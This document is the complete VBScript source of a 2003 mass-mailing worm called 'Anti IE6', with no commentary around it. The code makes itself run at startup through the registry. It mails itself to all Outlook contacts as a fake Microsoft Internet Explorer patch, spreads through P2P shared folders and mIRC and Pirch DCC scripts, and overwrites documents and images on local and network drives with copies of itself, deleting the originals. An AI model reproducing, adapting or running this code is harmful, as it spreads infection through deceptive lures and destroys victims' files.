   ' VBS/Anti IE6 by Ýëåêòðîíèê, 19.03.2003
   On Error Resume Next
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set ws = CreateObject("WScript.Shell")
   Set name_of_worm = fso.GetFile(WScript.ScriptFullName)
   name_of_worm.Copy (fso.GetSpecialFolder(1) & "\IE6.vbs")
   Set ShowWorm = fso.GetFile(fso.GetSpecialFolder(1) & "\IE6.vbs")
   ShowWorm.Attributes = 0
   name_of_worm.Copy (fso.GetSpecialFolder(1) & "\win32.vbs")
   ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\win32", "Wscript.exe " & fso.GetSpecialFolder(1) & "\win32.vbs %1"
   Set outlook_application = CreateObject("Outlook.Application")
   If Not outlook_application = "" Then
   For Each Address_Lists In outlook_application.GetNameSpace("MAPI").AddressLists
   For Address_Total = 1 To Address_Lists.AddressEntries.Count
   car_wshwc = "WSHWC"
   MIXDLLXLQMAQQFAG6 = ws.RegRead("HKEY_CURRENT_USER\Software\" & car_wshwc & "\Anti IE6\" & Address_Lists.AddressEntries(Address_Total))
   If MIXDLLXLQMAQQFAG6 <> car_wshwc Then
   Set new_mail = outlook_application.CreateItem(0)
   new_mail.Recipients.Add (Address_Lists.AddressEntries(Address_Total))
   new_mail.Subject = "Re: Microsoft"
   new_mail.Body = "Çäðàâñòâóéòå êîìïàíèÿ Microsoft ïðåäëàãàåò âàì íîâóþ áåñïëàòíóþ óñëóãó ïî çàøèâàíèþ äûð â Internet Explore 6 (÷òîáû çàøèòü äûðêó çàïóñòèòå ôàéë ñöåíàðèÿ)"
   new_mail.Attachments.Add (fso.GetSpecialFolder(1) & "\IE6.vbs")
   new_mail.DeleteAfterSubmit = True
   new_mail.Importance = 2
   new_mail.Send
   ws.RegWrite "HKEY_CURRENT_USER\Software\" & car_wshwc & "\Anti IE6\" & Address_Lists.AddressEntries(Address_Total), car_wshwc
   End If
   Next
   Next
   End If
   ProgramFilesDir = ws.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   For SwitchFolders = 0 To 9
   FolderArray = Array("C:\Kazaa\My Shared Folder", _
   ProgramFilesDir & "\KaZaA Lite\My Shared Folder", _
   "C:\My Downloads", _
   ProgramFilesDir & "\Kazaa\My Shared Folder", _
   ProgramFilesDir & "\KaZaA Lite\My Shared Folder", _
   ProgramFilesDir & "\Bearshare\Shared", _
   ProgramFilesDir & "\Edonkey2000", _
   ProgramFilesDir & "\Morpheus\My Shared Folder", _
   ProgramFilesDir & "\Grokster\My Grokster", _
   ProgramFilesDir & "\ICQ\Shared Files")
   If fso.FolderExists(FolderArray(SwitchFolders)) Then
   name_of_worm.Copy (FolderArray(SwitchFolders) & "\IE6.vbs")
   Set ShowP2PFile = fso.GetFile(FolderArray(SwitchFolders) & "\IE6.vbs")
   ShowP2PFile.Attributes = 0
   End If
   Next
   name_of_worm.Copy (fso.GetSpecialFolder(1) & "\IE6.vbs")
   Set ShowMircCopy = fso.GetFile(fso.GetSpecialFolder(1) & "\IE6.vbs")
   ShowMircCopy.Attributes = 0
   ProgramFilesDir = ws.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If fso.FileExists("C:\Mirc\Mirc.ini") Then
   mIRCPath = "C:\Mirc"
   Else
   If fso.FileExists("C:\Mirc32\Mirc.ini") Then
   mIRCPath = "C:\Mirc32"
   Else
   If fso.FileExists(ProgramFilesDir & "\Mirc\Mirc.ini") Then
   mIRCPath = ProgramFilesDir & "\Mirc"
   End If
   End If
   End If
   If Not mIRCPath = "" Then
   Set WriteMirc = fso.CreateTextFile(mIRCPath & "\Script.ini", True)
   WriteMirc.WriteLine ("[script]")
   WriteMirc.WriteLine ("n5= on 1:JOIN:#:{")
   WriteMirc.WriteLine ("n6= /if ( $nick == $me ) { halt }")
   WriteMirc.WriteLine ("n7= /msg $nick Microsoft Çàøèâàíèå äûð â ñèñòåìå!")
   WriteMirc.WriteLine ("n8= /dcc send -c $nick " & fso.GetSpecialFolder(1) & "\IE6.vbs")
   WriteMirc.WriteLine ("n9= }")
   WriteMirc.Close
   Set HideScript = fso.GetFile(mIRCPath & "\Script.ini")
   HideScript.Attributes = 2
   End If
   name_of_worm.Copy (fso.GetSpecialFolder(1) & "\IE6.vbs")
   Set ShowPirchCopy = fso.GetFile(fso.GetSpecialFolder(1) & "\IE6.vbs")
   ShowPirchCopy.Attributes = 0
   If fso.FolderExists("C:\Pirch") Then
   PirchPath = "C:\Pirch"
   Else
   If fso.FolderExists("C:\Pirch32") Then
   PirchPath = "C:\Pirch32"
   Else
   ProgramFilesDir = ws.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If fso.FolderExists(ProgramFilesDir & "\Pirch") Then
   PirchPath = ProgramFilesDir & "\Pirch"
   End If
   End If
   End If
   If Not PirchPath = "" Then
   Set WritePirch = fso.CreateTextFile(Path & "\Events.ini", True)
   WritePirch.WriteLine ("[Levels]")
   WritePirch.WriteLine ("Enabled=1")
   WritePirch.WriteLine ("Count=6")
   WritePirch.WriteLine ("Level1=000-Unknowns")
   WritePirch.WriteLine ("000-UnknownsEnabled=1")
   WritePirch.WriteLine ("Level2=100-Level 100")
   WritePirch.WriteLine ("100-Level 100Enabled=1")
   WritePirch.WriteLine ("Level3=200-Level 200")
   WritePirch.WriteLine ("200-Level 200Enabled=1")
   WritePirch.WriteLine ("Level4=300-Level 300")
   WritePirch.WriteLine ("300-Level 300Enabled=1")
   WritePirch.WriteLine ("Level5=400-Level 400")
   WritePirch.WriteLine ("400-Level 400Enabled=1")
   WritePirch.WriteLine ("Level6=500-Level 500")
   WritePirch.WriteLine ("500-Level 500Enabled=1")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[000-Unknowns]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("Event1=ON JOIN:#:/msg $nick Íîâàÿ ïðîãðàììà ïî çàøèâàíèþ äûð â Internet Explore áåñïëàòíî")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[100-Level 100]")
   WritePirch.WriteLine ("User1=*!*@*")
   WritePirch.WriteLine ("UserCount=1")
   WritePirch.WriteLine ("Event1=ON JOIN:#:/dcc send $nick " & fso.GetSpecialFolder(1) & "\IE6.vbs")
   WritePirch.WriteLine ("EventCount=1")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[200-Level 200]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[300-Level 300]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[400-Level 400]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.WriteLine ("")
   WritePirch.WriteLine ("[500-Level 500]")
   WritePirch.WriteLine ("UserCount=0")
   WritePirch.WriteLine ("EventCount=0")
   WritePirch.Close
   Set HideScript2 = fso.GetFile(PirchPath & "\Events.ini")
   HideScript2.Attributes = 2
   End If
   If Day(Now) = 13 And Month(Now) = 0 Then
   ws.Run "Rundll32.exe User.exe,ExitWindows"
   End If
   E1()
   Sub E1()
   On Error Resume Next
   Set a = CreateObject("Scripting.FileSystemObject")
   For Each SeekNetCopyDrives In a.Drives
   If SeekNetCopyDrives.DriveType = 2 _
   Or SeekNetCopyDrives.DriveType = 3 Then
   E3 (SeekNetCopyDrives.Path & "\")
   End If
   Next
   End Sub
   Sub E2(FileTarget)
   On Error Resume Next
   Set otf = a.GetFile(WScript.ScriptFullName)
   ra = otf.ReadAll
   otf.Close
   Set a = CreateObject("Scripting.FileSystemObject")
   Set f = a.GetFolder(FileTarget)
   For Each n In f.Files
   FileExt = LCase(a.GetExtensionName(n.Path))
   If FileExt = "bmp" Or FileExt = "txt" Or FileExt = "ico" Or FileExt = "wmp" Or FileExt = "doc" Or FileExt = "jpg" Then
   fso.CopyFile WScript.ScriptFullName, n.Path & ".vbs"
   fso.DeleteFile (n.Path)
   End If
   Next
   End Sub
   Sub E3(FileTarget)
   On Error Resume Next
   Set a = CreateObject("Scripting.FileSystemObject")
   Set f = a.GetFolder(FileTarget)
   For Each n In f.SubFolders
   E2 (n.Path)
   E3 (n.Path)
   Next
   End Sub
